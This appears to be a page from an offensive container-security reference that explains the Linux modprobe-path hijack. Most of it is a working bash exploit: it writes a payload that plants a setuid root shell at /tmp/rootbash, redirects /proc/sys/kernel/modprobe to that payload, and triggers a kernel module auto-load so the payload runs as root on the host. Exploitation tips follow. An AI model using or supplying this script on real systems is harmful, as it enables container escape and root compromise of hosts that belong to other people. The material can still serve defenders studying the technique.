---
title: "modprobe path: hijacking the kernel module auto-loader"
order: 1
description: "The kernel runs the program named in /proc/sys/kernel/modprobe, as root in the host namespaces, whenever it needs to auto-load a module. A container able to write that path points it at a payload and then triggers an auto-load, for example by using an unknown network protocol or filesystem type, causing the kernel to execute the payload on the host."
keywords:
  - modprobe path
  - module autoload
  - usermode helper
  - request_module
  - container escape
---

# modprobe path

When the kernel needs a module it does not have loaded, it calls `request_module`, which runs the user-space helper named in `/proc/sys/kernel/modprobe` (normally `/sbin/modprobe`). That helper runs as root in the host's initial namespaces. If a container can write `modprobe` on the host's procfs, it replaces the helper path with its own payload, then triggers any action that makes the kernel attempt an auto-load, and the kernel executes the payload on the host.

Confirm writability:

```bash
cat /proc/sys/kernel/modprobe
[ -w /proc/sys/kernel/modprobe ] && echo writable
```

## The technique

```bash
# 1. Host-resolvable payload path via the overlay upperdir
host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
cat > /payload <<SH
#!/bin/sh
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
id > $host/out 2>&1
SH
chmod +x /payload

# 2. Point the module loader at the payload
echo "$host/payload" > /proc/sys/kernel/modprobe

# 3. Trigger an auto-load. Any of these makes the kernel call request_module:
#    use a socket for a protocol family with no loaded module,
python3 -c 'import socket; socket.socket(socket.AF_INET, socket.SOCK_STREAM, 132)' 2>/dev/null
#    or mount an unknown filesystem type,
mount -t doesnotexist none /mnt 2>/dev/null
#    or run a binary with an unknown magic that needs a binfmt module
sleep 1; cat /out; ls -l /tmp/rootbash
```

The socket call with an obscure protocol number (here SCTP, 132) causes the kernel to `request_module("net-pf-...")`, invoking the modprobe path, which is now the payload.

## Exploitation notes

- The trigger must be an action the kernel services by auto-loading a module; a protocol family or filesystem type that is genuinely absent on the host works best. If the module is already loaded, no `request_module` fires, so pick an obscure one.
- Like the other usermode-helper routes, the payload path has to resolve on the host filesystem, hence the `upperdir` recovery.
- Writing `modprobe` needs the host's procfs mounted writable, which usually implies `CAP_SYS_ADMIN` or `--privileged`; a container's namespaced sysctl view would not affect the host.

## References

- [Kernel docs: modprobe sysctl](https://docs.kernel.org/admin-guide/sysctl/kernel.html#modprobe)
- [man 2 request_key / kmod behaviour](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [HackTricks: modprobe escape](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/sensitive-mounts)
